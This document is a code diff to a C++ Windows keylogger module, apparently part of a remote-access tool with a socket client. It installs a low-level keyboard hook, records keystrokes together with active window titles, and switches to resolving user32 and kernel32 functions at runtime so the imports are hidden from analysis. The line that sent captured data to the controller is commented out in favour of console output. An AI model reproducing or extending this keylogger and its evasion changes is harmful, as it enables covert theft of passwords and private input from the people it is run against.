@@ -5,6 +5,7 @@
 extern Cliente* cCliente;
 
 HHOOK kHook = nullptr;
+mod_Keylogger* mod_Instance = nullptr;
 std::mutex mtx_buffer;
 std::vector<char> cBuffer;
 bool g_Run = false;
@@ -38,10 +39,12 @@ std::string GetActiveWindow_Title() {
     char buffer[1024];
     ZeroMemory(buffer, 1024);
     std::string strOut = "";
-    if (GetWindowTextA(GetForegroundWindow(), buffer, 1024) == 0) {
-        strOut = "Sin Titulo";
-    }else {
-        strOut = buffer;
+    if (mod_Instance->USER32.pGetWindowTextA && mod_Instance->USER32.pGetForegroundWindow) {
+        if (mod_Instance->USER32.pGetWindowTextA(mod_Instance->USER32.pGetForegroundWindow(), buffer, 1024) == 0) {
+            strOut = "Sin Titulo";
+        }else {
+            strOut = buffer;
+        }
     }
     return strOut;
 }
@@ -370,13 +373,17 @@ const char* c_KeyMap(int iCode) {
 
 LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
     if (!g_Run) {
-        UnhookWindowsHookEx(kHook);
-        kHook = nullptr;
-        PostQuitMessage(0);
+        if (mod_Instance->USER32.pUnhookWindowsHookEx && mod_Instance->USER32.pPostQuitMessage) {
+            mod_Instance->USER32.pUnhookWindowsHookEx(kHook);
+            kHook = nullptr;
+            mod_Instance->USER32.pPostQuitMessage(0);
+        }
     }
     
     if (nCode < 0) {
-        return CallNextHookEx(kHook, nCode, wparam, lparam);
+        if (mod_Instance->USER32.pCallNextHookEx) {
+            return mod_Instance->USER32.pCallNextHookEx(kHook, nCode, wparam, lparam);
+        }
     }
 
     std::string strTempBuffer = "";
@@ -405,11 +412,45 @@ LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
 
     }
 
-    return CallNextHookEx(kHook, nCode, wparam, lparam);
+    if (mod_Instance->USER32.pCallNextHookEx) {
+        return mod_Instance->USER32.pCallNextHookEx(kHook, nCode, wparam, lparam);
+    }
 }
 
 mod_Keylogger::mod_Keylogger() {
-    return;
+
+    this->hKernel32DLL = wrapLoadDLL("kernel32.dll");
+    this->hUser32DLL = wrapLoadDLL("user32.dll");
+    
+    if (this->hKernel32DLL) {
+        this->KERNEL32.pGetModuleHandleA = (st_Kernel32_KL::LPGETMODULEHANDLEA) wrapGetProcAddr(this->hKernel32DLL, "GetModuleHandleA"  );
+    }
+
+    if (this->hUser32DLL) {
+        this->USER32.pGetWindowTextA      = (st_User32_KL::LPGETWINDOWTEXTA)     wrapGetProcAddr(this->hUser32DLL, "GetWindowTextA"     );
+        this->USER32.pGetForegroundWindow = (st_User32_KL::LPGETFOREGROUNDWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetForegroundWindow");
+        this->USER32.pUnhookWindowsHookEx = (st_User32_KL::LPUNHOOKWINDOWSHOOKEX)wrapGetProcAddr(this->hUser32DLL, "UnhookWindowsHookEx");
+        this->USER32.pCallNextHookEx      = (st_User32_KL::LPCALLNEXTHOOKEX)     wrapGetProcAddr(this->hUser32DLL, "CallNextHookEx"     );
+        this->USER32.pSetWindowsHookExA   = (st_User32_KL::LPSETWINDOWSHOOKEXA)  wrapGetProcAddr(this->hUser32DLL, "SetWindowsHookExA"  );
+        this->USER32.pPostQuitMessage     = (st_User32_KL::LPPOSTQUITMESSAGE)    wrapGetProcAddr(this->hUser32DLL, "PostQuitMessage"    );
+        this->USER32.pPeekMessageA        = (st_User32_KL::LPPEEKMESSAGEA)       wrapGetProcAddr(this->hUser32DLL, "PeekMessageA"       );
+        this->USER32.pGetMessageA         = (st_User32_KL::LPGETMESSAGEA)        wrapGetProcAddr(this->hUser32DLL, "GetMessageA"        );
+        this->USER32.pTranslateMessage    = (st_User32_KL::LPTRANSLATEMESSAGE)   wrapGetProcAddr(this->hUser32DLL, "TranslateMessage"   );
+        this->USER32.pDispatchMessageA    = (st_User32_KL::LPDISPATCHMESSAGEA)   wrapGetProcAddr(this->hUser32DLL, "DispatchMessageA"   );
+    }
+
+    mod_Instance = this;
+}
+
+mod_Keylogger::~mod_Keylogger() {
+
+    if(this->hKernel32DLL) {
+        wrapFreeLibrary(this->hKernel32DLL);
+    }
+
+    if (this->hUser32DLL) {
+        wrapFreeLibrary(this->hUser32DLL);
+    }
 }
 
 void mod_Keylogger::Start() {
@@ -447,14 +488,18 @@ bool mod_Keylogger::m_IsRunning() {
 }
 
 void mod_Keylogger::CaptureKeys() {
-    kHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyboard_Proc, GetModuleHandle(NULL), 0);
+    if (mod_Instance->USER32.pSetWindowsHookExA && mod_Instance->KERNEL32.pGetModuleHandleA &&
+        mod_Instance->USER32.pPeekMessageA && mod_Instance->USER32.pGetMessageA &&
+        mod_Instance->USER32.pTranslateMessage && mod_Instance->USER32.pDispatchMessageA) {
+        kHook = mod_Instance->USER32.pSetWindowsHookExA(WH_KEYBOARD_LL, Keyboard_Proc, mod_Instance->KERNEL32.pGetModuleHandleA(NULL), 0);
 
-	MSG msg;
-    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	}
+        MSG msg;
+        mod_Instance->USER32.pPeekMessageA(&msg, NULL, 0, 0, PM_NOREMOVE);
+        while (mod_Instance->USER32.pGetMessageA(&msg, NULL, 0, 0)) {
+            mod_Instance->USER32.pTranslateMessage(&msg);
+            mod_Instance->USER32.pDispatchMessageA(&msg);
+        }
+    }
 }
 
 void mod_Keylogger::SendThread() {
@@ -480,7 +525,8 @@ void mod_Keylogger::SendThread() {
         std::string strData = Get_Data();
         int iData_Size = strData.size();
         if (iData_Size > 0) {
-            cCliente->cChunkSend(cCliente->sckSocket, strData.c_str(), iData_Size, 0, true, nullptr, EnumComandos::KL_Salida);
+            std::cout << strData << "\n";
+            //cCliente->cChunkSend(cCliente->sckSocket, strData.c_str(), iData_Size, 0, true, nullptr, EnumComandos::KL_Salida);
             Clear_Data(iData_Size+1); // +1 por el byte nulo \0
         }
         
